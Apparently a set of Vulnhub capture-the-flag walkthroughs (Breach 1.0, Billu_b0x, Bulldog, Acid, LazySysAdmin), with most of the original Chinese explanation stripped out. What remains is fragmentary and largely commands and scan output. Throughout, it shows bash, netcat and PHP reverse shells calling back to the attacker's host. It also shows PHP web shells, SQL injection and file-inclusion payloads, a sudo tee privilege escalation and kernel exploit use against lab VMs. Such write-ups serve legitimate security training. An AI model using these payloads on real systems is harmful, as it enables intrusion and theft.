
Vulnhub-------------------------------Breach1.0 Vulnhub ------------------------------Billu_b0x

Vulnhub -------------------------------Bulldog1 Vulnhub---------------------------------Acid Vulnhub---------------------------------LazysysAdmin-1 Vulnhub---------------------------------Freshly Vulnhub---------------------------------FristiLeaks v1.3 Vulnhub---------------------------------The Ether Vulnhub---------------------------------zico2 Vulnhub---------------------------------Quaoar Vulnhub---------------------------------SickOs 1.1 Vulnhub---------------------------------BSides-Vancouver-2018Workshop Vulnhub---------------------------------Kioptrix 1 Vulnhub----------------------------------Zico2 Vulnhub----------------------------------Kioptrix 3 Vulnhub----------------------------------Kioptrix 4
Vulnhub - 
Vulnhub
Vulnhub VMwareVirtualBox Boot2rootrootflaghttps://www.vulnhub.com
 Breach1.0



https://download.vulnhub.com/breach/Breach-1.0.zip

Breach1.0BooT2Root/CTF VMIP192.168.110.140host-only Knightmarerastamouseroot 

Boot to rootrootflag

host-onlyIP192.168.110.140 WindowsIP192.168.110.220NmapBurpsuit WiresharkSqlmapncPython2.7JDKDirBusterAWVSNessusKali Linux

 Breach1.0IPnmap-A txt nmap -v -A 192.168.110.140 -oN Breach.txt

80web  http://192.168.110.140/


0x01
(1)  Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo  base64 (2) Burpsuit Decoderbase64base64base64 pgibbons:damnitfeel$goodtobeagang$ta
0x02cmsSSLkeystore
(1)  initech.html

(2) initech.html Employee portal  http://192.168.110.140/impresscms/user.php  impresscms

base64impresscms  pgibbons
 damnitfeel$goodtobeagang$ta (3) exploit-db.comimpress cmsImpressCMS 1.3.9 SQL https://www.exploitdb.com/exploits/39737/  /modules/profile/admin/field.php  
(4) Inbox3 1ImpressCMS Admin Bill 2MichaelIDS/IPS
3peterSSL192.168.110.140/.keystore (5)  http://192.168.110.140/.keystore SSLkeystorekeystore 
0x03SSLWireshark
(1) 
contenttroll.gif profile 
(2)  View Account  Content  Content SSL implementation test capture  (3)  http://192.168.110.140/impresscms/modules/content/content.php?content_id=1   _SSL_test_phase1.pcap Wireshark pCAP They told me the alias, storepassword and keypassword are all set to 'tomcat' Keystorekey  tomcat 
a.SSL keystoreb.tomcat (4) WindowsJDKJDKkeytool.exe C:\Program Files\Java\jre1.8.0_121\bin\keytool.exe
keystoreCkeystore keytool -list -keystore c:\keystore tomcat (5) .p12keystorekeytooltomcatkeystore.p12
keytool -importkeystore -srckeystore c:\keystore -destkeystore c:\tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat
(6) .p12Wireshark

.p12CWiresharkWireshark _SSL_test_phase1.pcap  ----Protocols--SSLEdit 192.168.110.140 8443 http  tomcat
0x04tomcatURL
(1) httpshttp 192.168.110.129192.168.110.140cmdid tomcat (2) Tomcat UnauthorizedrequestresponseTomcat https://192.168.110.140:8443/_M@nag3Me/html  http basic Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC base64 dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC Burpsuit Decoder Tomcat TomcattomcatTt\5D8F(#!*u=G)4m7zB
shell
0x05 Tomcatget shell
(1) tomcat (2) Tomcatget shelljspcmd jspspycaidao.zipzipcaidao.warwar (2) WAR file to deploywar /caidaojsp (3)  https://192.168.110.140:8443/caidao/caidao.jsp (4) id;pwd (5) war web shellbashshell

0x06 mysql root
(1) id1000 cat /etc/passwd milton  blumbergh (2) tomcat /var/www/5446/

(3) phpfe4db1f7bc038d60776dcb66ab3404d5.php 0d93f85c5061c44cdffeb8381b2772fd.php mysqlmysqlroot (4) shellnccmdshellWindowsnc  echo "bash -i >& /dev/tcp/192.168.110.220/4444 0>&1" | bash ncsehll (5) mysqlmysqlmysqlexitmysql  mysql -u root -p use mysql; select user,password from user; exit milton 6450d89bd3aff1d893b85d3ad65d2ec2  https://www.somd5.com/ miltonthelaststraw
0x07 miltonblumbergh
(1) suPython python -c 'import pty;pty.spawn("/bin/bash")' (2) milton su - milton thelaststraw miltonhomesome_script.sh (3)  uanme -a  cat /etc/issue Linux Breach 4.2.0-27-genericUbuntu Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) (4) sublumberghblumbergh  (5) 76 http://192.168.110.140/images/ 1milton http://192.168.110.140/images/bill.png
http://192.168.110.140/images/initech.jpg http://192.168.110.140/images/troll.gif
http://192.168.110.140/images/cake.jpg http://192.168.110.140/images/swingline.jpg http://192.168.110.140/images/milton_beach.jpg miltonmy_badge.jpg

kali linuxstringsimages.txtvim bill.png   coffeestains exiftool.exebill.pngexif coffeestains (6)blumbergh blumbergh coffeestains (7)/usr/share/cleanuptidyup.sh tidyup.sh cd /var/lib/tomcat6/webapps && find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf 3webapps  tidyup.shroot sudosudo -l rootteetidyup.sh/usr/bin/tee/usr/share/cleanup/tidyup.sh teetidyup.sh
0x07rootshellflag
(1) tidyup.shshell tidyup.shrootrootteeteetidyup.shshell shell.txtbashshellncshellnc echo "nc -e /bin/bash 192.168.110.220 5555" > shell.txt teeshell.txttidyup.sh cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh tidyup.sh cat /usr/share/cleanup/tidyup.sh (2) ncshellrootflag,home (3) crontab3tidyup.sh (4) jspJspSpyflair.jpgWindows (5) flag I NEED TO TALK ABOUT YOUR FLAIR 



(1) CMSTomcat (2) sslWiresharkSSLTomcatURL (3) Tomcatget shell (4) rootteetidyup.shroot shell

(1) keytoolSSL (2) Tomcatget shell web shelltidyup.sh3shell shell (3) mysqlncexitexit milton (4) root shelltidyup.sh (5) crontabroot shell,redisroot sshroot crontabVulnhub
 Billu_b0x


https://download.vulnhub.com/billu/Billu_b0x.zip

ubuntu32, PHP apache MySQL

Boot to rootWebroot

VMWarenetIP WindowsNmapBurpsuitSqlmapncPython2.7DirBuster AWVSNessuskaliWindows


ip Billu_b0xnetNmapVMware Network Adapter VMnet8 NATCIPIP nmap -sP 192.168.64.1/24 ip 192.168.64.161
 nmap1-65535-Atxt nmap -p1-65535 -A 192.168.64.161 -oN billu.txt     TCP 22 SSH OpenSSH 5.9p1 TCP 80 HTTP Apache httpd 2.2.22 web"Show me your SQLI skills"

 (1) SQL (2) DirBuster (3) AWVSAPPScan (4) FirefoxburpburpRequestResponse (5)  (6) sshshell
1SQL (1)  admin' or 'a'='a -- jsTry again (2) sqlmappost sqlmap.py -u "http://192.168.64.161" --data "un=admin&ps=admin&login=let%27s+login" --level 3 --dbms mysql sqlmapsqlmaptamper fuzz
2windowsDirBusterkali Linuxdirb  test.phpadd.phpin.phpc.phpindex.phpshow.phpuploaded_images phpmy 3phppasswd

(1) test.phpfilefile  http://192.168.64.161?file=/etc/passwd  (2) FirefoxHackbarBrupsuitgetpostpasswd hackerbar postpasswd: burpsuitChange request methodgetpostpasswd (3) add.phpin.phpc.phpindex.phpshow.phppanel.php  (4) passwd1id 1000icasshicaroot
4add.phpin.php add.phpin.phpphp info
5c.php mysql billu b0x_billu ica_lab
6mysqlphpmyadmin (1) dirb/phpmyphpmyadmin mysqlphpmyadminsshicamysqlbillu b0x_billusshphpmyadmin SQLmysqlphpmyadmin mysqlUbuntu
7phpmyphpmyadmin (1) phpmyadminconfig.inc.phpURL /var/www/phpmy (2) HackbarBurpsuitconfig.inc.phpHackbar rootroottoor (3) Burpsuit
8xshell sshroot 9mysql rootphpmyadminmysqlrootmysql mysql stop/waitingmysqlmysql  sshmysqlIP192.168.64.162

106mysqlphpmyadmin billub0x_billu  ica_lab authwebbiLLuhEx_it
shell
11indexcmd shellshell (1) web ·   http://192.168.64.162/uploaded_images/ (2) add usershell testpanel.phppanel.php  http://192.168.64.162/uploaded_images/ jack.php cmd <?php system($_GET['cmd']); ?>  (3) burp posturl POST /panel.php?cmd=cat%20/etc/passwd;ls postbodycmd.jpg load=/uploaded_images/cmd.jpg&continue=continue  cat /etc/passwd;ls (4) bashshell echo "bash -i >& /dev/tcp/192.168.64.1/4444 0>&1" | bash url posturl ncshell
12 uploaded_images echo '<?php eval($_POST['123456']);?>' >> caidao.php 

13exp (1)  uanme -a  cat /etc/issue (2) Ubuntuexp https://www.exploit-db.com/exploits/37292/
14 (1) 

chmod 777 37292.c (2) exp gcc 37292.c -o exp (3) exproot


3 1testindex.phpsqlsql shell (1) index.php $uname=str_replace('\'','',urldecode($_POST['un'])); $pass=str_replace('\'','',urldecode($_POST['ps'])); str_replace\' SQLpayload\' urldecode (2) payload' or 1=1 -- \'str_replace\' php (3) payload' or 1=1 -- \' shell 2phpmyadminc.phpmysqlphpmyadminshell 3phpmyadminrootssh mysql
 (1) mysqlphpmyadmin 2sqlmapmysql (2) test.phpgetpost (3) index.phpSQLsql phpmyadmin (4) panel.phptest.phpshell (5) +shellshell (6) Ubuntu
 bulldog-1


 https://www.anquanke.com/post/id/106459

https://download.vulnhub.com/bulldog/bulldog.ova

  Boot-to-Root,root

rootflag

VirtualBoxIP 172.20.10.7 WindowsIP172.20.10.5BurpsuitncPython2.7 DirBuster KaliVMWareIP172.20.10.6

ip IPIP172.20.10.7NmapCIP
 nmap1-65535txt nmap -p1-65535 -A 172.20.10.7 -oN bulldog.txt     TCP 23 SSH open-ssl 7.2p2 TCP 80 HTTP WSGIServer Python 2.7.12 TCP 8080 HTTP WSGIServer Python 2.7.12 Linux 3.2-4.9


web (1)  (2) DirBuster (3) URLAWVSwebCMS 
ssh (1)  (2) websshshell
1 (1)  http://172.20.10.7/  notice (2) DirBusterdevadmin (3)  http://172.20.10.7/admin Django  (4)  http://172.20.10.7/dev  phpCMSDjango Djangophpphpphp webshellWeb-shell http://172.20.10.7/dev/shell/ ,
2hash (1)  http://172.20.10.7/dev Team Leadhash: We'll remove these in prod. It's not like a hacker can do anything with a hash (2) hash40sha1hashhashCMD5  (3) 2hash Back End: nick@bulldogindustries.com nickbulldog CMD5 Database: sarah@bulldogindustries.com sarahbulldoglover CMD5
3 (1) 23ssh (2) sarahbulldoglover (3) webshell
shell

4 webshell&& lsid ls && id id
5shell (1) Windowsnc nc -lvnp 4444 (2)  ls && bash -i >& /dev/tcp/172.20.10.5/4444 0>&1 server500 (3) bashechobashshell echo "bash -i >& /dev/tcp/172.20.10.5/4444 0>&1" | bash

6 cat /etc/passwd , bulldogadmindjango 7 find / -user bulldogadmin 2>/dev/null (1) notecustomPermissionApp /home/bulldogadmin/.hiddenadmindirectory/note /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp (2) notewebserverroot (3) customPermissionAppstrings strings /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp noterootls 8root (1) SUPER ulitimatePASSWORD youCANTget HSUPERultimatePASSWORDyouCANTget (2) sumust be run from a terminalVulhubPython  python -c 'import pty;pty.spawn("/bin/bash")' (3)  sudo su - rootflag (4) su23sshXshellsshsudo su -  flag  django  SUPERultimatePASSWORDyouCANTget django sudo su SUPERultimatePASSWORDyouCANTget


1.devadmin (1) devsha1webshell  (2) admindevsha1 2.shellshellbashshell py shell 3.id1000 4.root


(1) sha1devhash40sha1 cmd52hashcatsha1 (2) shellbash shellpythonshellbash shellbashecho+xPython shell (3) rootid1000  (4) rootstringsroot 
 Acid
 https://www.anquanke.com/post/id/10546


https://download.vulnhub.com/acid/Acid.rar

Welcome to the world of Acid. Fairy tails uses secret keys to open the magical doors. Acid


rootflag

WebrarVMplayervmxnet IP WindowsBurpsuitncPython2.7DirBuster 

ip AcidnetNmapVMware Network Adapter VMnet8NAT IPtxt nmap -sP 192.168.64.0/24 -oN acid-ip.txt ip 192.168.64.153
 nmap1-65535txt nmap -p1-65535 -sV -oN acid-port.txt 192.168.64.153 33447webwebApache2.4.10ubuntu http://192.168.64.153:33447 
 webApachewebApache Tcp 33447 Apache2.4.10 Ubuntu

web (1)  (2) DirBuster
Apache (1) Apache2.4.10 (2) www.exploit-db.comexpexp (3) Nessus
Ubuntu

10x643239334c6d70775a773d3d 0x16643239334c6d70775a773d3dASCII hexd293LmpwZw== base64 wow.jpg /image/wow.jpg  /images/wow.jpg  /icon/wow.jpg  dirbusterimages
 http://192.168.64.153:33447/images/wow.jpg  Notepad++ 3761656530663664353838656439393035656533376631366137633631306434ASCII hex 7aee0f6d588ed9905ee37f16a7c610d4md5 cmd563425ID 2Dirbuster challengecake.phpinclude.phphacked.phpBurpsuit Firefox3 3cake.php titleburpsuitResponse/Magic_Box loginindex.phpemail 4include.php  /etc/passwd Burpsuitresponse shellwow.jpghacked.php 5cake.phpIDwow.jpg63425 IDindexemail 6AWVS 7Magic_Boxlow.php,command.php 8low.phpcommand.php 192.168.64.1;id burpsuitresponseid
shell
9phpshellWindowsnc4444 getpostpayloadurlbashshellncshell payload bash -i >& /dev/tcp/192.168.64.1/4444 0>&1 nc -e /bin/bash -d 192.168.64.1 4444 phpshellpayloadURLburp php -r '$sock=fsockopen("192.168.64.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

ncshelll susu: must be run from a terminal google pythonshell echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py python /tmp/asdf.py su

10 cat /etc/passwd ,acid,saman,root 11 find / -user acid 2>/dev/null /sbin/raw_vs_isi/hint.pcapngkaliWireshark scp /sbin/raw_vs_isi/hint.pcapng root@10.10.10.140:/root/ TCPsaman1337hax0r 12susamanrootflag sudo -i root1337hax0rrootflag.txt

 http://resources.infosecinstitute.com/acid-server-ctfwalkthroug h  1.challengecake.phpinclude.phphacked.php Magic_Boxcommand.php 2.phpshellhttppayloadurl 3.suGoogle 4.expmsf


1. phpshell, bashnc 2. suPython 3. shell

1. shell 2. suGoogle

3. index.php 4. OWASP

google

 LazySysAdmin: 1



https://download.vulnhub.com/lazysysadmin/Lazysysadmin.zip

Virtualbox  Vnware Workstation player

Enumeration is key Try Harder Look in front of you Tweet @togiemcdogie if you need more hints

ip
netdiscover netdiscover -i wlo1

 evilk0 netdiscover -i wlo1

Currently scanning: 192.168.21.0/16 | Screen View: Unique Hosts

1 Captured ARP Req/Rep packets, from 1 hosts. Total size: 42

_____________________________________________________________________________

IP

At MAC Address

Count

Len MAC Vendor / Hostname

-----------------------------------------------------------------------------

192.168.0.100 08:00:27:da:8a:ac

1

42 PCS Systemtechnik GmbH


masscan

masscan 192.168.0.100 -p 1-10000 --rate=1000

 evilk0 masscan 192.168.0.100 -p 1-10000 --rate=1000
Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2018-01-31 12:53:27 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan Scanning 1 hosts [10000 ports/host] Discovered open port 3306/tcp on 192.168.0.100 Discovered open port 6667/tcp on 192.168.0.100 Discovered open port 22/tcp on 192.168.0.100 Discovered open port 139/tcp on 192.168.0.100 Discovered open port 80/tcp on 192.168.0.100 Discovered open port 445/tcp on 192.168.0.100

nmap nmap -T4 -A -v 192.168.0.100 -p 0-10000

 evilk0 nmap -T4 -A -v 192.168.0.31 -p0-10000

Starting Nmap 7.50 ( https://nmap.org ) at 2018-01-31 20:55 CST

.................................

Scanning LazySysAdmin.lan (192.168.0.100) [10001 ports]

Discovered open port 80/tcp on 192.168.0.100

Discovered open port 22/tcp on 192.168.0.100

Discovered open port 139/tcp on 192.168.0.100

Discovered open port 445/tcp on 192.168.0.100

Discovered open port 3306/tcp on 192.168.0.100

Discovered open port 6667/tcp on 192.168.0.100

.................................

PORT

STATE SERVICE

VERSION

22/tcp open ssh

OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

| 1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)

| 2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)

| 256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)

|_ 256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (EdDSA)

80/tcp open http

Apache httpd 2.4.7 ((Ubuntu))

|_http-generator: Silex v2.2.7

| http-methods:

|_ Supported Methods: GET HEAD POST OPTIONS

| http-robots.txt: 4 disallowed entries

|_/old/ /test/ /TR2/ /Backnode_files/

|_http-server-header: Apache/2.4.7 (Ubuntu)

|_http-title: Backnode

139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

3306/tcp open mysql

MySQL (unauthorized)

6667/tcp open irc

InspIRCd

| irc-info:

| server: Admin.local

| users: 1.0 | servers: 1 | chans: 0 | lusers: 1 | lservers: 0 | source ident: nmap | source host: 192.168.2.107 |_ error: Closing link: (nmap@192.168.2.107) [Client exited] MAC Address: 08:00:27:DA:8A:AC (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.8 Uptime guess: 0.008 days (since Wed Jan 31 20:44:16 2018) Network Distance: 1 hop TCP Sequence Prediction: Difficulty=261 (Good luck!) IP ID Sequence Generation: All zeros Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:

| nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

| Names:

| LAZYSYSADMIN<00>

Flags: <unique><active>

| LAZYSYSADMIN<03>

Flags: <unique><active>

| LAZYSYSADMIN<20>

Flags: <unique><active>

| WORKGROUP<00>

Flags: <group><active>

|_ WORKGROUP<1e>

Flags: <group><active>

| smb-os-discovery:

| OS: Windows 6.1 (Samba 4.3.11-Ubuntu)

| Computer name: lazysysadmin

| NetBIOS computer name: LAZYSYSADMIN\x00

| Domain name: \x00

| FQDN: lazysysadmin

|_ System time: 2018-01-31T22:55:23+10:00

| smb-security-mode:

| account_used: guest

| authentication_level: user

| challenge_response: supported

|_ message_signing: disabled (dangerous, but default)

|_smbv2-enabled: Server supports SMBv2 protocol

TRACEROUTE

HOP RTT

ADDRESS

1 0.50 ms LazySysAdmin.lan (192.168.0.100)

NSE: Script Post-scanning. Initiating NSE at 20:55 Completed NSE at 20:55, 0.00s elapsed Initiating NSE at 20:55 Completed NSE at 20:55, 0.00s elapsed Read data files from: /usr/bin/../share/nmap

OS and Service detection performed. Please report any incorrect results at

https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.19 seconds
Raw packets sent: 11045 (487.680KB) | Rcvd: 11034 (442.816KB) masscannmapnmap 228013944533066667 webdirbdirb
 evilk0 ./dirb http://192.168.0.100 wordlists/common.txt -o /home/evilk0/Desktop/result.txt ./dirb url  -o  web,robots.txt4  http://192.168.0.100/robots.txt User-agent: * Disallow: /old/ Disallow: /test/ Disallow: /TR2/ Disallow: /Backnode_files/
curlwebbannerapache2.4.7Ubuntu

 evilk0 curl -I 192.168.0.100
HTTP/1.1 200 OK Date: Wed, 31 Jan 2018 13:01:20 GMT Server: Apache/2.4.7 (Ubuntu) Last-Modified: Sun, 06 Aug 2017 05:02:15 GMT ETag: "8ce8-5560ea23d23c0" Accept-Ranges: bytes Content-Length: 36072 Vary: Accept-Encoding Content-Type: text/html

dirbwordpressphpmyadmin

 dirb222 cat /home/evilk0/Desktop/result.txt | grep "^+"
+ http://192.168.0.100/index.html (CODE:200|SIZE:36072) + http://192.168.0.100/info.php (CODE:200|SIZE:77257) + http://192.168.0.100/robots.txt (CODE:200|SIZE:92) + http://192.168.0.100/server-status (CODE:403|SIZE:293) + http://192.168.0.100/phpmyadmin/favicon.ico (CODE:200|SIZE:18902) + http://192.168.0.100/phpmyadmin/index.php (CODE:200|SIZE:8262) + http://192.168.0.100/phpmyadmin/libraries (CODE:403|SIZE:300) + http://192.168.0.100/phpmyadmin/phpinfo.php (CODE:200|SIZE:8264) + http://192.168.0.100/phpmyadmin/setup (CODE:401|SIZE:459) + http://192.168.0.100/wordpress/index.php (CODE:301|SIZE:0) + http://192.168.0.100/wordpress/xmlrpc.php (CODE:405|SIZE:42) + http://192.168.0.100/javascript/jquery/jquery (CODE:200|SIZE:252879) + http://192.168.0.100/javascript/jquery/version (CODE:200|SIZE:5) + http://192.168.0.100/wordpress/wp-admin/admin.php (CODE:302|SIZE:0) + http://192.168.0.100/wordpress/wp-admin/index.php (CODE:302|SIZE:0) + http://192.168.0.100/wordpress/wp-content/index.php (CODE:200|SIZE:0) + http://192.168.0.100/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0) + http://192.168.0.100/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0) + http://192.168.0.100/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0) + http://192.168.0.100/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0) + http://192.168.0.100/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0) + http://192.168.0.100/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)

wpscan

root@kali:~# wpscan http://192.168.0.100/wordpress

_______________________________________________________________

__

_______ _____

\ \

/ / __ \ / ____|

\ \ /\ / /| |__) | (___ ___ __ _ _ __ ®

\ \/ \/ / | ___/ \___ \ / __|/ _` | '_ \

\ /\ / | |

____) | (__| (_| | | | |

\/ \/ |_| |_____/ \___|\__,_|_| |_|

WordPress Security Scanner by the WPScan Team

Version 2.9.3 Sponsored by Sucuri - https://sucuri.net @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_ _______________________________________________________________
[+] URL: http://192.168.0.100/wordpress/ [+] Started: Thu Feb 1 01:37:20 2018
[!] The WordPress 'http://192.168.0.100/wordpress/readme.html' file exists exposing a version number [+] Interesting header: LINK: <http://192.168.0.100/wordpress/index.php?rest_route=/>; rel="https://api.w.org/" [+] Interesting header: SERVER: Apache/2.4.7 (Ubuntu) [+] Interesting header: X-POWERED-BY: PHP/5.5.9-1ubuntu4.22 [!] Registration is enabled: http://192.168.0.100/wordpress/wp-login.php?action=register [+] XML-RPC Interface available under: http://192.168.0.100/wordpress/xmlrpc.php [!] Upload directory has directory listing enabled: http://192.168.0.100/wordpress/wpcontent/uploads/ [!] Includes directory has directory listing enabled: http://192.168.0.100/wordpress/wpincludes/
[+] WordPress version 4.8.5 (Released on 2018-01-16) identified from meta generator, links opml
[+] WordPress theme in use: twentyfifteen - v1.8
[+] Name: twentyfifteen - v1.8 | Last updated: 2017-11-16T00:00:00.000Z | Location: http://192.168.0.100/wordpress/wp-content/themes/twentyfifteen/ | Readme: http://192.168.0.100/wordpress/wp-content/themes/twentyfifteen/readme.txt
[!] The version is out of date, the latest version is 1.9 | Style URL: http://192.168.0.100/wordpress/wp-content/themes/twentyfifteen/style.css | Theme Name: Twenty Fifteen | Theme URI: https://wordpress.org/themes/twentyfifteen/ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty
Fifteen's simple,... | Author: the WordPress team | Author URI: https://wordpress.org/
[+] Enumerating plugins from passive detection ... [+] No plugins found
[+] Finished: Thu Feb 1 01:37:24 2018 [+] Requests Done: 356 [+] Memory used: 37.98 MB [+] Elapsed time: 00:00:04

enum4linux 192.168.0.100
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Feb 1 00:46:08 2018
========================== | Target Information |
========================== Target ........... 192.168.0.100 RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

===================================================== | Enumerating Workgroup/Domain on 192.168.0.100 |
===================================================== [+] Got domain/workgroup name: WORKGROUP

=============================================

| Nbtstat Information for 192.168.0.100 |

=============================================

Looking up status of 192.168.0.100

LAZYSYSADMIN <00> -

B <ACTIVE> Workstation Service

LAZYSYSADMIN <03> -

B <ACTIVE> Messenger Service

LAZYSYSADMIN <20> -

B <ACTIVE> File Server Service

WORKGROUP

<00> - <GROUP> B <ACTIVE> Domain/Workgroup Name

WORKGROUP

<1e> - <GROUP> B <ACTIVE> Browser Service Elections

MAC Address = 00-00-00-00-00-00

====================================== | Session Check on 192.168.0.100 |
====================================== [+] Server 192.168.0.100 allows sessions using username '', password ''

============================================ | Getting domain SID for 192.168.0.100 |
============================================

Domain Name: WORKGROUP Domain Sid: (NULL SID) [+] Can't determine if host is part of domain or part of a workgroup

=======================================

| OS information on 192.168.0.100 |

=======================================

[+] Got OS info for 192.168.0.100 from smbclient:

[+] Got OS info for 192.168.0.100 from srvinfo:

LAZYSYSADMIN Wk Sv PrQ Unx NT SNT Web server

platform_id

: 500

os version

: 6.1

server type

: 0x809a03

============================== | Users on 192.168.0.100 |
==============================

========================================== | Share Enumeration on 192.168.0.100 |
========================================== WARNING: The "syslog" option is deprecated

Sharename

Type

Comment

---------

----

-------

print$

Disk

Printer Drivers

share$

Disk

Sumshare

IPC$

IPC

IPC Service (Web server)

Reconnecting with SMB1 for workgroup listing.

Server ---------

Comment -------

Workgroup --------WORKGROUP

Master -------

[+] Attempting to map shares on 192.168.0.100 //192.168.0.100/print$ Mapping: DENIED, Listing: N/A //192.168.0.100/share$ Mapping: OK, Listing: OK //192.168.0.100/IPC$ [E] Can't understand response: WARNING: The "syslog" option is deprecated NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

===================================================== | Password Policy Information for 192.168.0.100 |
=====================================================

[+] Attaching to 192.168.0.100 using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):
[+] LAZYSYSADMIN [+] Builtin
[+] Password Info for Domain: LAZYSYSADMIN
[+] Minimum password length: 5 [+] Password history length: None [+] Maximum password age: Not Set [+] Password Complexity Flags: 000000
[+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0
[+] Minimum password age: None [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: Not Set
[+] Retieved partial password policy with rpcclient:
Password Complexity: Disabled Minimum Password Length: 5
=============================== | Groups on 192.168.0.100 |
===============================
[+] Getting builtin groups:
[+] Getting builtin group memberships:
[+] Getting local groups:
[+] Getting local group memberships:
[+] Getting domain groups:
[+] Getting domain group memberships:
======================================================================== | Users on 192.168.0.100 via RID cycling (RIDS: 500-550,1000-1050) |
========================================================================
[I] Found new SID: S-1-22-1

[I] Found new SID: S-1-5-21-2952042175-1524911573-1237092750 [I] Found new SID: S-1-5-32 [+] Enumerating users using SID S-1-5-32 and logon username '', password '' S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group) S-1-5-32-545 BUILTIN\Users (Local Group) S-1-5-32-546 BUILTIN\Guests (Local Group) S-1-5-32-547 BUILTIN\Power Users (Local Group) S-1-5-32-548 BUILTIN\Account Operators (Local Group) S-1-5-32-549 BUILTIN\Server Operators (Local Group) S-1-5-32-550 BUILTIN\Print Operators (Local Group) S-1-5-32-1000 *unknown*\*unknown* (8) S-1-5-32-1001 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password '' S-1-22-1-1000 Unix User\togie (Local User) [+] Enumerating users using SID S-1-5-21-2952042175-1524911573-1237092750 and logon username '', password '' S-1-5-21-2952042175-1524911573-1237092750-500 *unknown*\*unknown* (8) S-1-5-21-2952042175-1524911573-1237092750-501 LAZYSYSADMIN\nobody (Local User)
S-1-5-21-2952042175-1524911573-1237092750-512 *unknown*\*unknown* (8) S-1-5-21-2952042175-1524911573-1237092750-513 LAZYSYSADMIN\None (Domain Group) S-1-5-21-2952042175-1524911573-1237092750-514 *unknown*\*unknown* (8)
============================================== | Getting printer info for 192.168.0.100 |
============================================== No printers returned.
enum4linux complete on Thu Feb 1 00:46:33 2018
windows
net use k: \\192.168.0.100\share$
linux
mount -t cifs -o username='',password='' //192.168.0.100/share$ /mnt

deets.txtwp-config.php
mysqlphpmyadmin 5 12345WordPress My name is togie.   togie  12345 ssh
togie@LazySysAdmin:~$ whoami togie togie@LazySysAdmin:~$ id uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) togie@LazySysAdmin:~$ sudo su [sudo] password for togie: root@LazySysAdmin:/home/togie# id uid=0(root) gid=0(root) groups=0(root) root/root/proof.txttogieroot sudo suroottogieroot


 Admin  TogieMYSQL12345^^ WordPress404.phpPHPshell 

upload filehttp://192.168.0.100/wordpress/?p=2

root@kali:~# nc -vlp 1234

listening on [any] 1234 ...

192.168.0.100: inverse host lookup failed: Unknown host

connect to [192.168.0.109] from (UNKNOWN) [192.168.0.100] 36468

Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686

i686 i686 GNU/Linux

16:03:42 up 6 min, 0 users, load average: 0.01, 0.15, 0.11

USER

TTY

FROM

LOGIN@ IDLE JCPU PCPU WHAT

uid=33(www-data) gid=33(www-data) groups=33(www-data)

/bin/sh: 0: can't access tty; job control turned off

$ whoami

www-data

$ id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ sudo su

sudo: no tty present and no askpass program specified

no tty present and no askpass program specifiedpythonpython shell

python -c 'import pty; pty.spawn("/bin/sh")'

www-data

$ uname -r 4.4.0-31-generic $ lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 14.04.5 LTS Release: 14.04 Codename: trusty
CVE-2017-1000112gcc exp dirbkali
